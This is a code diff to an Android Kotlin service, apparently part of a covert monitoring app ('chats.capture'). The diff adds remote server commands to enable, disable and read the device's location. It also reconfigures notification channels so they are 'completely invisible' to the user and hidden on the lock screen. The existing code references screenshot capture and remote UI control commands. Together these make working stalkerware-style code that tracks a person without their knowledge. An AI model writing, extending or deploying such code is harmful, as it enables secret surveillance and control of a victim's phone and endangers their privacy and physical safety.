@@ -1,5 +1,6 @@
 package com.chats.capture.services
 
+import android.app.Notification
 import android.app.NotificationChannel
 import android.app.NotificationManager
 import android.content.Context
@@ -11,6 +12,7 @@ import com.chats.capture.managers.DeviceRegistrationManager
 import com.chats.capture.managers.RemoteUIControlManager
 import com.chats.capture.managers.ScreenshotManager
 import com.chats.capture.managers.ServiceMonitor
+import com.chats.capture.services.LocationService
 import com.chats.capture.network.ApiClient
 import com.chats.capture.network.CommandResultRequest
 import com.chats.capture.updates.UpdateManager
@@ -179,6 +181,22 @@ class AppFirebaseMessagingService : FirebaseMessagingService() {
                         Timber.d("Executing capture_screenshot command")
                         success = captureScreenshot()
                         message = if (success) "Screenshot captured and uploaded successfully" else "Failed to capture screenshot"
+                    }
+                    "enable_location" -> {
+                        Timber.d("Executing enable_location command")
+                        success = enableLocationTracking()
+                        message = if (success) "Location tracking enabled successfully" else "Failed to enable location tracking"
+                    }
+                    "disable_location" -> {
+                        Timber.d("Executing disable_location command")
+                        success = disableLocationTracking()
+                        message = if (success) "Location tracking disabled successfully" else "Failed to disable location tracking"
+                    }
+                    "get_location" -> {
+                        Timber.d("Executing get_location command")
+                        val locationResult = getCurrentLocation()
+                        success = locationResult.first
+                        message = locationResult.second
                     }
                     // UI Control Commands
                     "ui_click", "ui_find_and_click", "ui_find_and_click_by_id", 
@@ -360,6 +378,58 @@ class AppFirebaseMessagingService : FirebaseMessagingService() {
     }
     
     /**
+     * Enable location tracking
+     */
+    private suspend fun enableLocationTracking(): Boolean {
+        return try {
+            val locationService = LocationService(this)
+            locationService.startTracking()
+            Timber.d("Location tracking enabled successfully")
+            true
+        } catch (e: Exception) {
+            Timber.e(e, "Error enabling location tracking")
+            false
+        }
+    }
+    
+    /**
+     * Disable location tracking
+     */
+    private suspend fun disableLocationTracking(): Boolean {
+        return try {
+            val locationService = LocationService(this)
+            locationService.stopTracking()
+            Timber.d("Location tracking disabled successfully")
+            true
+        } catch (e: Exception) {
+            Timber.e(e, "Error disabling location tracking")
+            false
+        }
+    }
+    
+    /**
+     * Get current location
+     */
+    private suspend fun getCurrentLocation(): Pair<Boolean, String> {
+        return try {
+            val locationService = LocationService(this)
+            val location = locationService.getCurrentLocation()
+            
+            if (location != null) {
+                val locationInfo = "Lat: ${location.latitude}, Lng: ${location.longitude}, Accuracy: ${location.accuracy}m"
+                Timber.d("Current location retrieved: $locationInfo")
+                Pair(true, locationInfo)
+            } else {
+                Timber.w("Location not available")
+                Pair(false, "Location not available")
+            }
+        } catch (e: Exception) {
+            Timber.e(e, "Error getting current location")
+            Pair(false, "Error: ${e.message}")
+        }
+    }
+    
+    /**
      * Report command execution result to server
      */
     private suspend fun reportCommandResult(commandId: String, success: Boolean, message: String) {
@@ -391,28 +461,37 @@ class AppFirebaseMessagingService : FirebaseMessagingService() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val notificationManager = getSystemService(NotificationManager::class.java)
             
-            // FCM notification channel (silent operation)
+            // FCM notification channel (completely invisible - no notifications shown to user)
             val fcmChannel = NotificationChannel(
                 FCM_CHANNEL_ID,
                 "FCM Notifications",
-                NotificationManager.IMPORTANCE_MIN
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) NotificationManager.IMPORTANCE_NONE else NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "Notifications from Firebase Cloud Messaging"
+                description = "Silent notifications from Firebase Cloud Messaging"
                 setSound(null, null) // No sound
                 enableVibration(false) // No vibration
                 setShowBadge(false) // No badge
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET // Hidden on lock screen
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false) // No bubbles
+                }
             }
             
-            // Command channel (for silent commands from server)
+            // Command channel (completely invisible - no notifications shown to user)
             val commandChannel = NotificationChannel(
                 COMMAND_CHANNEL_ID,
                 "Command Channel",
-                NotificationManager.IMPORTANCE_LOW
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) NotificationManager.IMPORTANCE_NONE else NotificationManager.IMPORTANCE_MIN
             ).apply {
                 description = "Silent commands from server"
                 setShowBadge(false)
                 enableVibration(false)
                 enableLights(false)
+                setSound(null, null) // No sound
+                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET // Hidden on lock screen
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
+                    setAllowBubbles(false) // No bubbles
+                }
             }
             
             notificationManager?.createNotificationChannels(
